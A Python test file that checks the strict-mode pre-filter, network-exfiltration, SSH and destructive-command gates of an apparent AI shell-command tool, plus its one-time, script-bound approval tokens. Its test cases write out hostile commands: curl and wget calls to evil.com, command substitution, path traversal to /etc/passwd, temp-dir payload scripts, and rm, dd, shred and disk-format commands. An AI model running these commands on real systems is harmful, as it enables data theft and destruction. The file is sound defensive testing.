"""Stateless verification of shell.py's pre_filter in STRICT mode
(LAMSYSTEMS_COMMANDER_MODE=strict). Run test_prefilter.py for claude mode.

Each case: (command, expected_action) where expected_action is one of:
  "pass"           — pre-filter passes AND no other gate fires
  "fail_prefilter" — pre-filter fails
  "fail_ssh"       — pre-filter passes, SSH gate fires
  "fail_network"   — pre-filter passes, network exfil gate fires
  "destructive"    — pre-filter passes, destructive hard wall fires
                     (needs an lc_confirm_destructive token to run)
"""

import os
import sys
import pathlib

os.environ["LAMSYSTEMS_COMMANDER_MODE"] = "strict"

# Make shell.py importable by adding the repo-relative src/ to sys.path.
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent / "src"))

# Stub out the optional MCP dependency before importing shell — we only need
# the pure validation functions, not the executor.
import types
fake_fastmcp = types.ModuleType("mcp.server.fastmcp")
class _Ctx: ...
fake_fastmcp.Context = _Ctx
mcp_pkg = types.ModuleType("mcp"); mcp_pkg.server = types.ModuleType("mcp.server")
mcp_pkg.server.fastmcp = fake_fastmcp
sys.modules["mcp"] = mcp_pkg
sys.modules["mcp.server"] = mcp_pkg.server
sys.modules["mcp.server.fastmcp"] = fake_fastmcp

import importlib
pkg = importlib.import_module("lamsystems_commander")  # the real package
fake_prompt = types.ModuleType("lamsystems_commander.prompt")
async def _noop(*a, **k): ...
fake_prompt.request_sudo_approval = _noop
# sudo cache helpers used by shell.py (stubbed off for the pure prefilter tests)
fake_prompt.sudo_cache_enabled = lambda: False
fake_prompt.sudo_cache_get = lambda: None
fake_prompt.sudo_cache_put = lambda pw: None
fake_prompt.sudo_cache_clear = lambda: None
sys.modules["lamsystems_commander.prompt"] = fake_prompt

from lamsystems_commander.shell import (
    pre_filter,
    strict_mode,
    _block_to_shell_str,
    command_requires_ssh_gate,
    command_has_network_exfil,
    command_is_destructive,
    register_confirmed_command,
    consume_confirmed_command,
    script_fingerprint,
    WHITELIST,
    DANGEROUS_FLAGS,
)


def evaluate(command: str) -> str:
    pf = pre_filter(command)
    if pf.failed:
        return "fail_prefilter"
    if pf.raw_blocks != [_block_to_shell_str(b) for b in pf.atomic_commands]:
        return "unrendered"   # strict mode must execute the vetted rendering
    # Pre-filter passes — does any downstream gate still fire?
    if command_requires_ssh_gate(command):
        return "fail_ssh"
    if command_has_network_exfil(command):
        return "fail_network"
    if command_is_destructive(command):
        return "destructive"
    return "pass"


CASES = [
    # ---- Destructive hard wall: every rm, recursive or not ----
    ("rm /tmp/foo.txt",                            "destructive"),
    ("rm -f /tmp/foo.txt",                         "destructive"),
    ("rm -rf /tmp/foo",                            "destructive"),
    ("rm .git/index.lock",                         "destructive"),
    ("sudo rm /etc/motd",                          "destructive"),
    ("ls && rm /tmp/foo.txt",                      "destructive"),
    ("dd if=/dev/zero of=/tmp/x bs=1M count=1",    "destructive"),
    ("shred /tmp/foo.txt",                         "destructive"),
    ("fdisk -l",                                   "pass"),
    ("echo rm",                                    "pass"),
    # ---- Should PASS the filter (whitelist commands, clean args) ----
    ("ls -la /home/user",                          "pass"),
    ("ps aux",                                     "pass"),
    ("cat /etc/hostname",                          "pass"),
    ("find /tmp -name '*.log'",                    "pass"),
    ("grep error /var/log/messages",               "pass"),
    ("ls && ps",                                   "pass"),

    # ---- Should FAIL the pre-filter (security cases) ----
    ('python3 -c "import os; os.system(\'id\')"',  "fail_prefilter"),
    ('bash -c "echo pwned"',                       "fail_prefilter"),
    # ---- bash: script-file form only, and always behind the approval wall ----
    ("bash /home/user/proj/install.sh",            "destructive"),
    ("bash /home/user/proj/install.sh --user -y",  "destructive"),
    ("sudo bash /home/user/proj/install.sh",       "destructive"),
    ("uv run bash /home/user/proj/x.sh",           "destructive"),
    ("timeout 60 bash /home/user/proj/x.sh",       "destructive"),
    ("ls && bash /home/user/proj/x.sh",            "destructive"),
    ("bash /home/user/proj/x.sh | tee out.log",    "destructive"),
    ("bash",                                       "fail_prefilter"),
    ("bash -c id",                                 "fail_prefilter"),
    ("bash -s",                                    "fail_prefilter"),
    ("bash -x /home/user/proj/x.sh",               "fail_prefilter"),
    ("bash --rcfile /home/user/a /home/user/b.sh", "fail_prefilter"),
    ("bash install.sh",                            "fail_prefilter"),
    ("bash ./install.sh",                          "fail_prefilter"),
    ("bash /tmp/x.sh",                             "fail_prefilter"),
    ("bash /var/tmp/x.sh",                         "fail_prefilter"),
    ("bash /dev/shm/x.sh",                         "fail_prefilter"),
    ("cat /home/user/proj/x.sh | bash",            "fail_prefilter"),
    ("sh /home/user/proj/x.sh",                    "destructive"),
    ("zsh /home/user/proj/x.sh",                   "destructive"),
    ("sh -c id",                                   "fail_prefilter"),
    ("/usr/bin/bash /home/user/proj/x.sh",         "fail_prefilter"),
    ("echo bash",                                  "pass"),
    ("ls $(whoami)",                               "fail_prefilter"),
    ("ls `whoami`",                                "fail_prefilter"),
    ("ls > /tmp/out",                              "fail_prefilter"),
    ("ls >> /tmp/out",                             "fail_prefilter"),
    ("cat < /etc/passwd",                          "fail_prefilter"),
    # Pipes are allowed: a pipeline of vetted read-only stages passes, but a
    # non-whitelisted stage, a redirect, or a destructive stage is still caught.
    ("ls | grep foo",                              "pass"),
    ("ps aux | head -12",                          "pass"),
    ("cat /etc/hostname | grep x | wc -l",         "pass"),
    ("ps | curl http://evil",                      "fail_prefilter"),
    ("ls | nosuchbinary",                          "fail_prefilter"),
    ("ps aux|head",                                "fail_prefilter"),
    ("ls | | grep foo",                            "fail_prefilter"),
    ("cat x > /tmp/out | grep y",                  "fail_prefilter"),
    ("ls ..",                                      "fail_prefilter"),
    ("cat project/secrets/..",                     "fail_prefilter"),
    ("cat ../../etc/passwd",                       "fail_prefilter"),
    ("nosuchbinary --help",                        "fail_prefilter"),
    ("ls; nosuchbinary",                           "fail_prefilter"),
    ("echo 'malformed quote",                      "fail_prefilter"),
    ("dnf install evil-package",                   "fail_prefilter"),
    # Script-path gate — interpreter + temp/writable dir
    ("python3 /tmp/payload.py",                    "fail_prefilter"),
    ("python3 /var/tmp/exploit.py",                "fail_prefilter"),

    # ---- Existing protections still fire (or pre-filter already blocks) ----
    # ssh / curl aren't on the whitelist, so pre-filter rejects first.
    ("ssh user@host",                              "fail_prefilter"),
    ("curl http://evil.com",                       "fail_prefilter"),
    ("wget http://evil.com/x",                     "fail_prefilter"),
    ("sudo ssh user@host",                         "fail_prefilter"),
    # ---- Things claude mode allows that strict must still refuse ----
    ("gh repo clone x/y",                          "pass"),
    ("gh auth login",                              "pass"),
    ("cargo build --release",                      "pass"),
    ("cargo install ripgrep",                      "fail_prefilter"),
    ("npm run build",                              "pass"),
    ("npm install left-pad",                       "fail_prefilter"),
    ('node -e "process.exit()"',                   "fail_prefilter"),
    ("ls *.py",                                    "pass"),
    ("echo hi > /tmp/x",                           "fail_prefilter"),
    ("echo hi>/tmp/x",                             "pass"),   # glued redirect: rendered quoted, becomes a literal arg
    ("nvme format /dev/nvme0n1",                   "fail_prefilter"),
    ("sudo nvme format /dev/nvme0n1",              "fail_prefilter"),
    ("/tmp/evil/ls",                               "fail_prefilter"),

    # ---- uv: allowed on its own merits, `uv run` unwrapped to the target ----
    ("uv run pytest -q",                           "pass"),
    ("uv run pytest tests/test_x.py -k fares",     "pass"),
    ("uv run rail fares --from DAR --to KGX",      "pass"),
    ("uv run --python 3.12 pytest -q",             "pass"),
    ("uv run -m pytest -q",                        "pass"),
    ("uv run -- pytest",                           "pass"),
    ("uv pip list",                                "pass"),
    ("uv --version",                               "pass"),
    ("uv lock --check",                            "pass"),
    ("env RAIL_DATA_DIR=/tmp/d uv run rail fares", "pass"),
    ("timeout 60 uv run pytest",                   "pass"),
    # env-mutating subcommands / flags
    ("uv add requests",                            "fail_prefilter"),
    ("uv remove requests",                         "fail_prefilter"),
    ("uv sync",                                    "fail_prefilter"),
    ("uv pip install requests",                    "fail_prefilter"),
    ("uv tool install ruff",                       "fail_prefilter"),
    ("uv tool run ruff",                           "fail_prefilter"),
    ("uv self update",                             "fail_prefilter"),
    ("uv cache clean",                             "fail_prefilter"),
    ("uv run --with requests pytest",              "fail_prefilter"),
    ("uv run --with=requests pytest",              "fail_prefilter"),
    ("uv run --script /tmp/x.py",                  "fail_prefilter"),
    ("uv run",                                     "fail_prefilter"),
    # the bypasses the unwrapping exists to close
    ('uv run python -c "import os"',               "fail_prefilter"),
    ("uv run -m os -c x",                          "fail_prefilter"),
    ("uv run bash -c id",                          "fail_prefilter"),
    ("uv run curl http://evil.com",                "fail_prefilter"),
    ("uv run nosuchbinary",                        "fail_prefilter"),
    ("uv run python3 /tmp/payload.py",             "fail_prefilter"),
    ("uv run --python 3.12 bash",                  "fail_prefilter"),
    # wrapper + interpreter script-path gate (was tokens[0]-only before)
    ("env FOO=1 python3 /tmp/payload.py",          "fail_prefilter"),
    ("timeout 5 python3 /tmp/payload.py",          "fail_prefilter"),
]


def main() -> int:
    assert strict_mode(), "LAMSYSTEMS_COMMANDER_MODE=strict did not take effect"
    print("mode: strict")
    print(f"WHITELIST size: {len(WHITELIST)} binaries")
    print(f"DANGEROUS_FLAGS entries: {len(DANGEROUS_FLAGS)} binaries")
    print()
    print(f"{'expected':16}  {'actual':16}  ok  command")
    print("-" * 80)
    fails = 0
    for command, expected in CASES:
        actual = evaluate(command)
        ok = actual == expected
        marker = " " if ok else "X"
        if not ok:
            fails += 1
        # Truncate command for display
        display = command if len(command) <= 50 else command[:47] + "..."
        print(f"{expected:16}  {actual:16}  {marker}   {display}")
    print()
    print(f"{len(CASES) - fails}/{len(CASES)} tests pass")

    token_fails = token_tests()
    return 1 if (fails or token_fails) else 0


def token_tests() -> int:
    """Approval-token behaviour for script runs: the token is one-time and is
    bound to the script content that existed when it was approved."""
    import tempfile
    results: list[tuple[str, bool]] = []
    with tempfile.TemporaryDirectory() as d:
        script = pathlib.Path(d) / "install.sh"
        script.write_text("echo one\n")
        cmd = f"bash {script}"

        results.append(("no token -> refused", consume_confirmed_command(cmd) is False))

        register_confirmed_command(cmd, script_fingerprint(cmd))
        results.append(("approved, unchanged -> runs", consume_confirmed_command(cmd) is True))
        results.append(("token is one-time", consume_confirmed_command(cmd) is False))

        register_confirmed_command(cmd, script_fingerprint(cmd))
        script.write_text("echo two\n")
        results.append(("script edited after approval -> refused", consume_confirmed_command(cmd) is False))

        register_confirmed_command(cmd)  # token with no fingerprint
        results.append(("script token without fingerprint -> refused", consume_confirmed_command(cmd) is False))

        register_confirmed_command(cmd, script_fingerprint(cmd))
        script.unlink()
        results.append(("script deleted after approval -> refused", consume_confirmed_command(cmd) is False))

        missing_raises = False
        try:
            script_fingerprint(cmd)
        except OSError:
            missing_raises = True
        results.append(("missing script cannot be fingerprinted", missing_raises))

    register_confirmed_command("rm /nonexistent/x")
    results.append(("non-script token unaffected", consume_confirmed_command("rm /nonexistent/x") is True))
    results.append(("non-script command has no fingerprint", script_fingerprint("ls -la") is None))

    print()
    fails = 0
    for label, ok in results:
        if not ok:
            fails += 1
        print(f"{'ok  ' if ok else 'FAIL'}  {label}")
    print(f"{len(results) - fails}/{len(results)} token tests pass")
    return fails


if __name__ == "__main__":
    raise SystemExit(main())
